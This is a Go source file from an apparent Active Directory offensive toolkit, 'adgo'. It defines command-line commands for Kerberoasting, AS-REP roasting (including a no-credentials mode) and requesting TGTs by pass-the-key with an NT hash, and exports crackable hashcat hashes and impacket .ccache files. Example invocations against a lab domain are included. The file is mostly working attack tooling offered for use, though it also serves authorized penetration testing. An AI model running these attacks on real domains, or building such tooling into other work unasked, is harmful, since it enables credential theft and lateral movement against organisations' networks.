// cmd/adgo/commands/kerberos_cmd.go

package commands

import (
	"context"
	"fmt"
	"os"
	"strings"

	"adgo/pkg/common"
	"adgo/pkg/kerberos"
	"adgo/pkg/ldap"

	"github.com/spf13/cobra"
)

// ============================================================
// KerberosCmd — commande racine
// ============================================================

var KerberosCmd = &cobra.Command{
	Use:   "kerberos",
	Short: "Kerberos attacks and ticket operations",
	Long: `Kerberos attacks:
  kerberoast   — Request TGS for SPN accounts and export hashcat hashes (mode 13100)
  asreproast   — Capture AS-REP for accounts with pre-auth disabled (mode 18200)
  getTGT       — Request a TGT and export .ccache for impacket`,
}

func init() {
	KerberosCmd.AddCommand(kerberoastCmd)
	KerberosCmd.AddCommand(asreproastCmd)
	KerberosCmd.AddCommand(getTGTCmd)
}

// ============================================================
// kerberoast
// ============================================================

var kerberoastOutput string

var kerberoastCmd = &cobra.Command{
	Use:   "kerberoast",
	Short: "Kerberoast — request TGS for SPN accounts (hashcat mode 13100)",
	Example: `  adgo kerberos kerberoast -u john -p pass -d lab.local --dc-ip 192.168.1.10
  adgo kerberos kerberoast -u john -p pass -d lab.local --dc-ip 192.168.1.10 --output hashes.txt`,
	RunE: func(cmd *cobra.Command, args []string) error {
		username, password, domain, dcIP, err := requireCreds(cmd)
		if err != nil {
			return err
		}

		fmt.Printf("[*] Enumerating SPN accounts on %s...\n", domain)
		ldapURL := fmt.Sprintf("ldap://%s:389", dcIP)
		bindDN := fmt.Sprintf("%s@%s", username, domain)

		baseDN := domainToBaseDN(domain)
		ldapClient, err := ldap.NewClient(context.Background(), ldapURL, bindDN, password, false)
		if err != nil {
			return fmt.Errorf("LDAP connection failed: %v", err)
		}
		defer ldapClient.Close()

		spnUsers, err := ldapClient.EnumerateSPNs(baseDN)
		if err != nil {
			return fmt.Errorf("SPN enumeration failed: %v", err)
		}

		if len(spnUsers) == 0 {
			fmt.Println("[-] No SPN accounts found")
			return nil
		}

		fmt.Printf("[+] Found %d SPN account(s)\n\n", len(spnUsers))

		var targets []kerberos.SPNTarget
		for _, u := range spnUsers {
			for _, spn := range u.SPNs {
				targets = append(targets, kerberos.SPNTarget{
					Username: u.SAMAccountName,
					SPN:      spn,
				})
			}
		}

		results, err := kerberos.KerberoastTargets(username, domain, password, dcIP, targets)
		if err != nil {
			return err
		}

		var hashes []kerberos.HashcatHash
		for _, r := range results {
			if r.Hash.Hash != "" {
				hashes = append(hashes, r.Hash)
			}
		}

		if len(hashes) == 0 {
			fmt.Println("[-] No hashes captured")
			return nil
		}

		kerberos.PrintHashcatHashes(hashes)
		return kerberos.SaveHashcatFile(hashes, kerberoastOutput)
	},
}

func init() {
	kerberoastCmd.Flags().StringVar(&kerberoastOutput, "output", "", "Output file for hashcat hashes (default: auto-named)")
	kerberoastCmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")
	kerberoastCmd.MarkFlagRequired("dc-ip")
}

// ============================================================
// asreproast
// ============================================================

var (
	asreproastUsers   string
	asreproastOutput  string
	asreproastNoCreds bool
)

var asreproastCmd = &cobra.Command{
	Use:   "asreproast",
	Short: "AS-REP Roast — capture hashes for accounts without pre-auth (hashcat mode 18200)",
	Example: `  # With credentials (LDAP enumeration)
  adgo kerberos asreproast -u john -p pass -d lab.local --dc-ip 192.168.1.10

  # Without credentials (user list)
  adgo kerberos asreproast --no-creds --users users.txt -d lab.local --dc-ip 192.168.1.10

  # Without credentials (anonymous LDAP — usually blocked)
  adgo kerberos asreproast --no-creds -d lab.local --dc-ip 192.168.1.10`,
	RunE: func(cmd *cobra.Command, args []string) error {
		dcIP, _ := cmd.Flags().GetString("dc-ip")
		if dcIP == "" {
			return fmt.Errorf("--dc-ip is required")
		}

		// Domaine : flag local d'abord, puis flag global -d
		domain, _ := cmd.Flags().GetString("domain")
		if domain == "" {
			domain = common.Domain
		}
		if domain == "" {
			return fmt.Errorf("-d/--domain is required")
		}

		if asreproastNoCreds {
			_, err := kerberos.ASREPRoastNoCreds(asreproastUsers, domain, dcIP, asreproastOutput)
			return err
		}

		// Mode avec credentials — lus depuis les flags globaux
		username := common.Username
		password := common.Password
		if username == "" {
			return fmt.Errorf("-u/--username is required (or use --no-creds)")
		}

		_, err := kerberos.ASREPRoastWithCreds(username, password, domain, dcIP, asreproastOutput)
		return err
	},
}

func init() {
	asreproastCmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")
	asreproastCmd.Flags().String("domain", "", "Domain (overrides -d global flag)")
	asreproastCmd.Flags().StringVar(&asreproastUsers, "users", "", "Path to username list (for --no-creds mode)")
	asreproastCmd.Flags().StringVar(&asreproastOutput, "output", "", "Output file for hashcat hashes (default: auto-named)")
	asreproastCmd.Flags().BoolVar(&asreproastNoCreds, "no-creds", false, "Run without credentials (needs --users or anonymous LDAP)")
}

// ============================================================
// getTGT
// ============================================================

var (
	getTGTOutput string
	getTGTHash   string
)

var getTGTCmd = &cobra.Command{
	Use:   "getTGT",
	Short: "Request a TGT and save as .ccache for impacket",
	Example: `  # With password
  adgo kerberos getTGT -u john -p pass -d lab.local --dc-ip 192.168.1.10

  # Pass-the-Key (NT hash)
  adgo kerberos getTGT -u john --hash aad3b435b51404eeaad3b435b51404ee -d lab.local --dc-ip 192.168.1.10

  # Custom output
  adgo kerberos getTGT -u john -p pass -d lab.local --dc-ip 192.168.1.10 --output john.ccache`,
	RunE: func(cmd *cobra.Command, args []string) error {
		username, _, domain, dcIP, err := requireCreds(cmd)
		if err != nil {
			return err
		}

		// --hash local prioritaire, puis --hash global (common.NTLMHash)
		ntHash := getTGTHash
		if ntHash == "" {
			ntHash = common.NTLMHash
		}

		if ntHash != "" {
			result, err := kerberos.GetTGTWithHash(username, domain, ntHash, dcIP, getTGTOutput)
			if err != nil {
				return err
			}
			fmt.Printf("[*] export KRB5CCNAME=%s\n", result.OutputFile)
		} else {
			password := common.Password
			result, err := kerberos.GetTGT(username, domain, password, dcIP, getTGTOutput)
			if err != nil {
				return err
			}
			fmt.Printf("[*] export KRB5CCNAME=%s\n", result.OutputFile)
		}
		return nil
	},
}

func init() {
	getTGTCmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")
	getTGTCmd.Flags().StringVar(&getTGTOutput, "output", "", "Output .ccache file path (default: <user>_<domain>.ccache)")
	getTGTCmd.Flags().StringVar(&getTGTHash, "hash", "", "NT hash for Pass-the-Key (overrides --hash global flag)")
	getTGTCmd.MarkFlagRequired("dc-ip")
}

// ============================================================
// Helpers locaux
// ============================================================

// requireCreds lit les credentials depuis les flags globaux (common.*).
// Les flags globaux -u, -p, -d, --hash sont définis dans main.go et bindés
// sur common.Username, common.Password, common.Domain, common.NTLMHash.
func requireCreds(cmd *cobra.Command) (username, password, domain, dcIP string, err error) {
	username = common.Username
	password = common.Password
	domain = common.Domain

	dcIP, _ = cmd.Flags().GetString("dc-ip")

	if username == "" {
		err = fmt.Errorf("-u/--username is required")
		return
	}
	if domain == "" {
		err = fmt.Errorf("-d/--domain is required")
		return
	}
	if dcIP == "" {
		err = fmt.Errorf("--dc-ip is required")
		return
	}
	return
}

// domainToBaseDN convertit "lab.local" → "DC=lab,DC=local"
func domainToBaseDN(domain string) string {
	parts := strings.Split(domain, ".")
	dcs := make([]string, len(parts))
	for i, p := range parts {
		dcs[i] = "DC=" + p
	}
	return strings.Join(dcs, ",")
}

// Stderr raccourci pour os.Stderr (utilisé par d'autres commandes du package)
var Stderr = os.Stderr
